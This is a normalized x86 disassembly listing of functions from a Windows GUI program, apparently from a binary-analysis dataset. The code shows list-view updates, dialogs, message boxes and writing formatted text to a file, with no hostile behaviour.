mov ecx [ esp + 0x2a4 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x2a0
retn
push esi
lea eax [ esp + 0x140 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
lea ecx [ esp + 0x154 ]
push ecx
call edi
cmp eax 0xffffffff
mov [ esp + 0x30 ] eax
jne r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push esi
call edi
cmp eax 0xffffffff
mov [ esp + 0x30 ] eax
je r-xdata
cmp [ ebx ] 0x0
jl r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov edx [ ebx ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
mov edi ebp
call [ wsprintfA@IAT ]
lea eax [ esp + 0x48 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov esi ebp
sub esi edi
push esi
call [ GetFileAttributesA@IAT ]
test al 0x1
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov ebx [ esp + 0x10 ]
mov esi [ wsprintfA@IAT ]
xor edi edi
xor ebp ebp
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
dec esi
jne r-xdata
inc ebp
add ebx 0x4
cmp ebp 0x20
jl r-xdata
cmp edi ebp
jge r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ ebx + rw-data ]
test eax eax
jl r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov edx [ ebx + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
mov edi ebp
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov esi ebp
sub esi edi
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edi [ esp + 0x2b4 ]
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
dec esi
jne r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
mov edi edi
mov esi [ wsprintfA@IAT ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x40 ]
push r--data
push eax
call esi
lea eax [ esp + 0x48 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
mov ecx [ esp + 0x28 ]
push 0x0
lea edx [ esp + 0x3c ]
push edx
mov edx [ esp + 0x38 ]
push ecx
push eax
push edx
call [ WriteFile@IAT ]
mov eax [ esp + 0x2c ]
cmp eax 0x10
mov esi [ esp + 0x18 ]
mov ecx esi
jae r-xdata
lea eax [ esp + 0x18 ]
mov edx [ esp + 0x28 ]
add ecx edx
cmp eax 0x10
mov edx esi
jae r-xdata
lea ecx [ esp + 0x18 ]
test edx edx
jne r-xdata
lea edx [ esp + 0x18 ]
lea esi [ esp + 0x18 ]
mov eax edx
sub eax esi
xor eax eax
jmp r-xdata
push ecx
push eax
lea ecx [ esp + 0x1c ]
call sub_401ba0
mov eax [ esp + 0x2b4 ]
lea ecx [ eax + eax * 2 ]
shl ecx 0x2
mov eax [ ecx + rw-data ]
test eax eax
mov [ esp + 0x34 ] ecx
je r-xdata
sub ecx edx
test ecx ecx
je r-xdata
cmp eax [ ecx + rw-data ]
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ eax ]
mov edx [ esp + 0x30 ]
push edx
call [ CloseHandle@IAT ]
cmp [ esp + 0x2c ] 0x10
jb r-xdata
mov edi edi
mov eax 0x1
mov eax [ esp + 0x18 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
inc ebp
add edi 0x1c
cmp ebp 0x20
jl r-xdata
cmp ebx ebp
jge r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx + edi + 0x14 ]
test eax eax
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ ebp * 4 + rw-data ] 0x73
mov ebx ebp
jne r-xdata
mov esi ebp
sub esi ebx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + edi + 0x18 ]
add eax edi
cmp ecx 0x10
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov eax r--data
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x28 ]
push 0x0
lea ecx [ esp + 0x3c ]
push ecx
push edx
push eax
mov eax [ esp + 0x40 ]
push eax
call [ WriteFile@IAT ]
mov eax [ esp + 0x2c ]
cmp eax 0x10
mov esi [ esp + 0x18 ]
mov ecx esi
jae r-xdata
lea eax [ esp + 0x18 ]
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + edi + 0x18 ]
add eax edi
cmp ecx 0x10
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
dec esi
jne r-xdata
mov edx [ esp + 0x28 ]
add ecx edx
cmp eax 0x10
mov edx esi
jae r-xdata
lea ecx [ esp + 0x18 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
mov eax edx
lea esi [ eax + 0x1 ]
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
test edx edx
jne r-xdata
lea edx [ esp + 0x18 ]
lea esi [ esp + 0x18 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax edx
lea esi [ eax + 0x1 ]
mov edi edi
mov eax edx
sub eax esi
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
jmp r-xdata
push ecx
push eax
lea ecx [ esp + 0x1c ]
call sub_401ba0
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x34 ]
mov eax [ eax ]
cmp eax [ ecx + rw-data ]
mov [ esp + 0x10 ] eax
jne r-xdata
sub ecx edx
test ecx ecx
je r-xdata
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov ebx 0x1
mov ebp ebx
mov edi 0x1c
lea esp [ esp ]
sub_423170
mov eax [ rw-data ]
test eax eax
push esi
mov esi [ esp + 0x8 ]
je r-xdata
mov al [ esi + rw-data ]
test al al
je r-xdata
cmp [ eax + 0x380 ] esi
jne r-xdata
pop esi
retn
push esi
call sub_422a90
add esp 0x4
mov ecx [ rw-data ]
inc ecx
push ecx
lea ecx [ eax + 0x38 ]
call sub_421150
sub_4231b0
push ebp
mov ebp [ esp + 0x8 ]
test ebp ebp
jne r-xdata
mov al [ ebp + rw-data ]
test al al
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push ebx
lea ebx [ ebp + ebp * 2 ]
shl ebx 0x2
mov eax [ ebx + rw-data ]
test eax eax
push edi
jne r-xdata
push 0x0
push ebp
call sub_4221d0
add esp 0x8
lea ecx [ ebp + ebp * 2 ]
mov eax [ ecx * 4 + rw-data ]
test eax eax
lea ecx [ ecx * 4 + rw-data ]
jne r-xdata
mov edi [ eax ]
xor edi edi
jmp r-xdata
mov edx [ eax ]
xor edx edx
jmp r-xdata
pop edi
pop ebx
push esi
lea ecx [ ecx ]
cmp edi [ ebx + rw-data ]
je r-xdata
pop ebp
retn
mov ecx [ rw-data ]
and ecx 0x7
cmp ecx ebp
jne r-xdata
push eax
push edx
lea edx [ esp + 0x10 ]
push edx
call sub_420c80
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0xffffffff
push 0x0
push 0x0
push 0x1009
push eax
call [ SendMessageA@IAT ]
mov edi [ edi ]
cmp edi [ ebx + rw-data ]
jne r-xdata
mov ecx esi
call sub_420df0
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
cmp [ edi + 0x8 ] eax
jne r-xdata
pop esi
sub_4232a0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov al [ esi + rw-data ]
test al al
push edi
jne r-xdata
mov ebx [ esp + 0x1c ]
mov edi [ ebx ]
cmp edi 0xffffffff
jne r-xdata
push 0x0
push esi
call sub_4221d0
add esp 0x8
lea ecx [ esi + esi * 2 ]
shl ecx 0x2
mov eax [ ecx + rw-data ]
xor edx edx
test eax eax
je r-xdata
lea edi [ esi + esi * 2 ]
shl edi 0x2
mov [ ebx ] 0x0
mov eax [ edi + rw-data ]
test eax eax
je r-xdata
mov ecx [ ecx + rw-data ]
cmp eax ecx
je r-xdata
mov eax [ eax ]
cmp eax [ edi + rw-data ]
mov esi eax
je r-xdata
mov eax [ eax ]
pop edi
pop esi
pop ebp
mov [ ebx ] 0xffffffff
xor eax eax
pop ebx
retn
lea esp [ esp ]
mov ebx [ esp + 0x18 ]
mov ebp [ lstrcmpiA@IAT ]
cmp eax ecx
je r-xdata
mov eax [ eax ]
inc edx
cmp eax ecx
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ eax + 0x8 ]
pop edi
pop esi
pop ebp
pop ebx
retn
cmp edx edi
jge r-xdata
mov eax [ esi + 0x8 ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x1c ]
mov ecx [ eax ]
mov esi [ esi ]
inc ecx
mov [ eax ] ecx
cmp esi [ edi + rw-data ]
jne r-xdata
push ebx
push eax
call ebp
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
mov ebx [ esp + 0x1c ]
sub_423380
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfb58
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0x48
test eax eax
jne r-xdata
push ebx
push esi
push edi
mov edi [ esp + 0x68 ]
test edi edi
jne r-xdata
push eax
call sub_451770
mov eax [ rw-data ]
add esp 0x4
test eax eax
jne r-xdata
mov eax [ esp + 0x64 ]
cmp eax 0xffffffff
mov [ esp + 0xc ] 0xffffffff
jne r-xdata
mov esi [ SendMessageA@IAT ]
push 0x1
push 0xffffffff
push 0x100c
push eax
call esi
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
lea ecx [ esp + 0xc ]
push ecx
push edi
push eax
lea edx [ esp + 0xc ]
push edx
push edi
push 0x1
call sub_4232a0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x30 ] eax
lea eax [ esp + 0x2c ]
push eax
push 0x0
push 0x1005
push ecx
mov [ esp + 0x3c ] 0x4
call esi
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
mov ecx [ esp + 0x6c ]
cmp ecx 0xffffffff
jne r-xdata
mov edx [ rw-data ]
push 0x1
push esi
push esi
push esi
push esi
push esi
push 0x1
push esi
push 0xffffffff
push edx
push edi
call sub_4863a0
add esp 0x2c
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
lea eax [ esp + 0xc ]
push eax
push edi
push 0x2
jmp r-xdata
mov esi [ esp + 0x4c ]
jmp r-xdata
mov eax [ esp + 0x70 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0x214 ]
call sub_41f020
mov ecx eax
cmp ecx 0xffffffff
jne r-xdata
call sub_4232a0
add esp 0xc
mov esi eax
test esi esi
jne r-xdata
cmp ecx 0x4
jne r-xdata
inc eax
push eax
lea ecx [ esi + 0x38 ]
call sub_421150
xor ecx ecx
mov ecx [ rw-data ]
cmp ecx 0x5
jne r-xdata
mov eax [ esi + 0x34 ]
mov ebx 0x10
cmp eax ebx
jb r-xdata
mov ecx [ esp + 0x74 ]
push ecx
push eax
push esi
call sub_425f00
mov ecx [ esp + 0x60 ]
add esp 0xc
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
jmp [ ecx * 4 + jump_table_423668 ]
xor eax eax
cmp ecx 0x3
ja r-xdata
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
mov eax [ esi + 0x34 ]
mov ebx 0x10
cmp eax ebx
mov [ esp + 0x5c ] 0x0
jb r-xdata
lea eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
jmp r-xdata
lea ecx [ esi + 0x38 ]
call sub_41f020
dec eax
jmp r-xdata
xor eax eax
jmp r-xdata
lea ecx [ esi + 0x70 ]
call sub_41f020
dec eax
jmp r-xdata
mov [ rw-data ] 0xb
lea eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
test bl al
je r-xdata
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp eax ebx
jb r-xdata
cmp eax ebx
jb r-xdata
push eax
call [ GetFileAttributesA@IAT ]
test bl al
mov eax [ esi + 0x34 ]
je r-xdata
cmp [ esi + 0x34 ] ebx
jb r-xdata
lea eax [ esi + 0x20 ]
mov eax [ esi + 0x20 ]
jmp r-xdata
add esi 0x20
push esi
lea ecx [ esp + 0x14 ]
call sub_402510
jmp r-xdata
mov esi [ esi + 0x20 ]
push esi
lea ecx [ esp + 0x14 ]
call sub_402510
jmp r-xdata
add esi 0x20
push esi
call sub_464fe0
add esp 0x4
mov esi [ esi + 0x20 ]
push esi
call sub_464fe0
add esp 0x4
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
add esi 0x20
mov esi [ esi + 0x20 ]
jmp r-xdata
cmp [ esi + 0x34 ] ebx
jb r-xdata
cmp [ esp + 0x28 ] ebx
mov eax [ esp + 0x14 ]
jae r-xdata
push 0x0
push eax
call sub_42dee0
add esp 0x8
lea ecx [ esp + 0x10 ]
mov esi eax
call sub_4480e0
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
mov [ fs : 0x0 ] ecx
add esp 0x54
retn
lea eax [ esp + 0x14 ]
push eax
call sub_457f40
add esp 0x4
dec eax
push eax
push esi
lea ecx [ esp + 0x18 ]
call sub_401e80
sub_423680
push ebx
mov ebx [ esp + 0x8 ]
mov al [ ebx + rw-data ]
test al al
push ebp
jne r-xdata
push esi
push edi
lea edi [ ebx + ebx * 2 ]
shl edi 0x2
mov eax [ edi + rw-data ]
test eax eax
jne r-xdata
push 0x0
push ebx
call sub_4221d0
add esp 0x8
mov esi [ eax ]
xor esi esi
jmp r-xdata
pop edi
pop esi
jne r-xdata
mov ebx [ lstrcmpiA@IAT ]
cmp esi [ edi + rw-data ]
mov ebp [ esp + 0x18 ]
je r-xdata
mov eax [ esp + 0x14 ]
push 0x1
push 0xffffffff
push eax
push ebp
push ebx
call sub_423380
add esp 0x14
pop ebp
pop ebx
retn
pop ebp
mov eax 0xffffff9d
pop ebx
retn
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ edi + rw-data ]
mov ebx [ esp + 0x14 ]
cmp esi eax
mov esi [ esi ]
cmp esi [ edi + rw-data ]
jne r-xdata
push ebp
push eax
call ebx
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
sub_423720
mov eax [ esp + 0xc ]
sub esp 0x48
push ebx
push ebp
mov ebp [ esp + 0x58 ]
push esi
push edi
push eax
lea ecx [ ebp + 0xfc ]
call sub_421150
mov eax [ ebp + 0x380 ]
mov ecx [ eax * 4 + rw-data ]
mov esi [ SendMessageA@IAT ]
xor ebx ebx
cmp ecx ebx
jl r-xdata
mov edx [ ebp + 0x380 ]
lea eax [ edx + edx * 2 ]
shl eax 0x2
mov ecx [ eax + rw-data ]
cmp ecx ebx
jne r-xdata
mov edx [ rw-data ]
or eax 0x8
cmp edx eax
jne r-xdata
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x20 ]
push edx
push ecx
push 0x100e
push eax
mov [ esp + 0x30 ] ebx
call esi
mov edx [ rw-data ]
push ebx
lea ecx [ esp + 0x24 ]
push ecx
push edx
mov [ rw-data ] ebx
call [ InvalidateRect@IAT ]
cmp edi eax
je r-xdata
lea esp [ esp ]
mov eax [ eax + rw-data ]
cmp ecx eax
mov edi ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x48
retn
mov eax [ rw-data ]
mov [ esp + 0x60 ] eax
mov eax [ esp + 0x5c ]
cmp eax 0x1
mov [ edx * 4 + rw-data ] ebx
je r-xdata
mov edi [ edi ]
inc ebx
cmp edi eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x2
je r-xdata
cmp [ edi + 0x8 ] ebp
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebp + 0x380 ]
and eax 0x7
cmp eax ecx
jne r-xdata
mov edx [ rw-data ]
push 0x24
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
cmp eax 0x6
jne r-xdata
cmp eax 0x3
jne r-xdata
mov eax [ edi + 0x8 ]
cmp [ eax + 0x380 ] 0x3
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebx
call sub_4215f0
mov eax [ esp + 0x60 ]
add esp 0x4
test eax eax
jne r-xdata
mov eax [ rw-data ]
push 0x0
push sub_4208b0
push eax
push 0xe5
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ DialogBoxParamA@IAT ]
cmp eax 0xfffffffe
jne r-xdata
mov esi [ edi + 0x8 ]
test esi esi
mov ebp [ ebp + 0x380 ]
je r-xdata
push eax
call sub_42b540
add esp 0x4
call sub_428bd0
xor edi edi
push edi
push edi
push 0x1004
push eax
call esi
test eax eax
jle r-xdata
push ebp
call sub_429e00
push ebp
call j_sub_41d200
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x48
retn
mov eax [ ebp + 0x380 ]
mov ecx [ rw-data ]
or eax 0x8
cmp ecx eax
jne r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x380 ]
and ecx 0x7
cmp ecx eax
jne r-xdata
lea esi [ ebp + ebp * 2 ]
mov eax [ esi * 4 + rw-data ]
cmp edi eax
lea esi [ esi * 4 + rw-data ]
je r-xdata
mov ecx esi
call sub_420df0
push esi
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
mov eax 0x3
mov [ esp + 0x40 ] eax
mov [ esp + 0x3c ] eax
lea eax [ esp + 0x30 ]
push eax
push ebx
push 0x102b
xor edi edi
push ecx
mov [ rw-data ] edi
mov [ rw-data ] 0xffffffff
call esi
mov edx [ rw-data ]
push ebx
push 0xcf
push 0x111
push edx
call [ GetParent@IAT ]
push eax
call esi
mov ecx [ esp + 0x60 ]
mov edx [ rw-data ]
lea eax [ esp + 0x10 ]
push eax
push ecx
push 0x100e
push edx
mov [ esp + 0x20 ] edi
call esi
mov ecx [ rw-data ]
push edi
lea eax [ esp + 0x14 ]
push eax
push ecx
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x48
retn
mov ebp 0xfffffffc
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push ebx
push 0x1013
push ecx
call esi
mov eax [ esp + 0x60 ]
mov ecx [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push eax
push 0x100e
push ecx
mov [ esp + 0x20 ] 0x0
call esi
mov eax [ rw-data ]
mov edi [ InvalidateRect@IAT ]
push 0x0
lea edx [ esp + 0x14 ]
push edx
push eax
call edi
mov edx [ rw-data ]
lea ecx [ esp + 0x10 ]
push ecx
push ebx
push 0x100e
push edx
mov [ esp + 0x20 ] 0x0
call esi
mov ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x14 ]
push eax
push ecx
call edi
push eax
lea ecx [ ebp + 0x214 ]
call sub_421150
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push 0xffffffff
call sub_423380
add esp 0x14
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x48
retn
mov eax [ edi + 0x8 ]
cmp [ eax + 0x380 ] 0x3
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push ebp
call sub_4207d0
add esp 0x4
mov edx [ edi + 0x4 ]
mov eax [ edi ]
mov [ edx ] eax
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
push edi
mov [ ecx + 0x4 ] edx
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
dec eax
mov [ esi + 0x8 ] eax
mov ecx [ rw-data ]
lea eax [ esp + 0x30 ]
push eax
push edi
push 0x102b
push ecx
mov [ esp + 0x50 ] 0x3
mov [ esp + 0x4c ] ebp
call esi
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x1004
push edx
inc edi
call esi
cmp edi eax
jl r-xdata
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
push eax
call sub_42b540
add esp 0x4
call sub_428bd0
xor edi edi
push edi
push edi
push 0x1004
push eax
call esi
test eax eax
jle r-xdata
mov eax [ ebp + 0x380 ]
push edi
lea ecx [ esp + 0x64 ]
push ecx
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + rw-data ]
call sub_420c40
mov edx [ ebp + 0x380 ]
push edx
call sub_4207d0
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x48
retn
mov ecx esi
call sub_420df0
push esi
call j_sub_4b66ed#2
add esp 0x4
lea edx [ esp + 0x30 ]
push edx
mov eax 0x3
push ebx
mov [ esp + 0x48 ] eax
mov [ esp + 0x44 ] eax
mov eax [ rw-data ]
push 0x102b
xor edi edi
push eax
mov [ rw-data ] edi
mov [ rw-data ] 0xffffffff
call esi
mov ecx [ rw-data ]
push ebx
push 0xcf
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call esi
mov eax [ esp + 0x60 ]
mov ecx [ rw-data ]
lea edx [ esp + 0x10 ]
push edx
push eax
push 0x100e
push ecx
mov [ esp + 0x20 ] edi
call esi
mov eax [ rw-data ]
push edi
lea edx [ esp + 0x14 ]
push edx
push eax
call [ InvalidateRect@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x48
retn
mov ebp 0xfffffffc
jmp r-xdata
mov eax [ rw-data ]
lea edx [ esp + 0x30 ]
push edx
push edi
push 0x102b
push eax
mov [ esp + 0x50 ] 0x3
mov [ esp + 0x4c ] ebp
call esi
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x1004
push ecx
inc edi
call esi
cmp edi eax
jl r-xdata
sub_423c30
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfc64
push eax
mov eax [ esp + 0x24 ]
mov [ fs : 0x0 ] esp
sub esp 0x1a4
push ebx
push ebp
xor ebp ebp
cmp eax ebp
push esi
push edi
je r-xdata
mov edi [ esp + 0x1c4 ]
mov al [ edi + rw-data ]
test al al
jne r-xdata
mov [ eax ] ebp
mov esi [ esp + 0x1c8 ]
push r--data
push esi
call [ lstrlenA@IAT ]
lea eax [ eax + esi - 0x4 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
push ebp
push edi
call sub_4221d0
add esp 0x8
cmp [ edi * 4 + rw-data ] ebp
je r-xdata
push edi
call sub_423170
push edi
call sub_4231b0
add esp 0x8
shl edi 0x4
mov [ esp + 0x10 ] ebp
lea ebx [ edi + rw-data ]
xor eax eax
jmp r-xdata
push 0x384
call sub_4b573e
mov esi eax
add esp 0x4
mov [ esp + 0x1c ] esi
test esi esi
mov [ esp + 0x1bc ] 0x1
je r-xdata
mov ecx [ ebx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esp + 0x1b4 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x1b0
retn
xor edi edi
push sub_4480e0
push sub_401360
push 0x20
push 0x1c
push esi
call sub_4b6874
mov edi esi
jmp r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ edi + rw-data ]
lea ecx [ eax + ebp ]
mov eax [ esp + 0x1c8 ]
lea esi [ eax + 0x1 ]
cmp [ esp + 0x10 ] edx
jge r-xdata
mov esi [ esp + 0x1d4 ]
test esi esi
jne r-xdata
test edi edi
mov [ esp + 0x10 ] edi
mov [ esp + 0x1bc ] 0xffffffff
mov [ esp + 0x1c ] edi
je r-xdata
mov ecx [ ebx + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ esp + 0x1c8 ]
sub eax esi
push eax
mov eax [ ecx + 0x14 ]
push edx
push eax
push 0x0
call sub_401150
test eax eax
je r-xdata
add esi 0x4
mov ebx 0x20
mov edi edi
mov ecx [ esp + 0x1c8 ]
push ecx
lea ecx [ edi + 0x1c ]
call sub_421120
mov edx [ rw-data ]
push edx
lea ecx [ edi + 0xfc ]
call sub_421150
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
mov edi [ esp + 0x1c4 ]
mov edx [ esp + 0x10 ]
push 0x0
push edi
mov [ edi * 4 + rw-data ] edx
call sub_4221d0
add esp 0x8
mov esi eax
call sub_421430
cmp edi 0x3
jne r-xdata
